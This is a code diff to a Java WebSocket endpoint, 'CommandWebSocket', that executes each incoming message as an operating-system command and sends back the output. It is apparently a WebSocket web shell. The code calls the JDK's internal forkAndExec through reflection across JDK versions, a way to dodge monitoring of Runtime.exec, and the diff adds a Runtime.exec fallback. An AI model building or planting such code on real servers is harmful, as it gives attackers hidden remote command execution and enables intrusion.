@@ -27,9 +27,14 @@ public class CommandWebSocket extends Endpoint implements MessageHandler.Whole<S
     }
 
     @Override
-    public void onMessage(String s) {
+    public void onMessage(String cmd) {
         try {
-            InputStream inputStream = forkAndExec(s);
+            InputStream inputStream = null;
+            try {
+                inputStream = forkAndExec(cmd);
+            } catch (Throwable e) {
+                inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
+            }
             byte[] buf = new byte[8192];
             int length;
             ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
@@ -91,12 +96,10 @@ public class CommandWebSocket extends Endpoint implements MessageHandler.Whole<S
             Object launchMechanismObject = launchMechanismField.get(processObject);
             int mode = 0;
             try {
-                // JDK7 的某些版本
                 Field value = launchMechanismObject.getClass().getDeclaredField("value");
                 value.setAccessible(true);
                 mode = (Integer) value.get(launchMechanismObject);
             } catch (NoSuchFieldException e) {
-                // JDK8+
                 int ordinal = (Integer) launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);
                 mode = ordinal + 1;
             }
@@ -107,8 +110,7 @@ public class CommandWebSocket extends Endpoint implements MessageHandler.Whole<S
             forkMethod.invoke(processObject, mode, helperpathObject, result, argBlock, args.length,
                     null, envc[0], null, std_fds, false);
         } catch (NoSuchFieldException e) {
-            e.printStackTrace();
-            // JDK6 与 JDK7 低版本
+            // JDK7
             Method forkMethod = processClass.getDeclaredMethod("forkAndExec", byte[].class, byte[].class, int.class,
                     byte[].class, int.class, byte[].class, int[].class, boolean.class);
             forkMethod.setAccessible(true);
@@ -121,6 +123,7 @@ public class CommandWebSocket extends Endpoint implements MessageHandler.Whole<S
             initStreamsMethod.setAccessible(true);
             initStreamsMethod.invoke(processObject, std_fds);
         } catch (NoSuchMethodException e) {
+            // JDK11
             Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class, boolean.class);
             initStreamsMethod.setAccessible(true);
             initStreamsMethod.invoke(processObject, std_fds, false);
